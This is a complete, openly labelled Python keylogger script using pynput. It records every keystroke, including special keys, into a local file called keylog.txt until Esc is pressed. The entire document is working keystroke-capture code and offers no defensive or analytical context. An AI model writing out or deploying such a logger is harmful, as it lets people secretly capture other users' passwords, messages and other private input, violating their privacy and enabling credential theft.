from pynput import keyboard

# File to store the logs
log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            # Handle normal keys
            f.write(f"{key.char}")
    except AttributeError:
        # Handle special keys (space, enter, etc.)
        with open(log_file, "a") as f:
            f.write(f" [{key}] ")

def on_release(key):
    # Stop the keylogger if 'Esc' is pressed
    if key == keyboard.Key.esc:
        print("Exiting keylogger...")
        return False

# Start listening to keyboard events
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    print("Keylogger started. Press 'Esc' to stop.")
    listener.join()
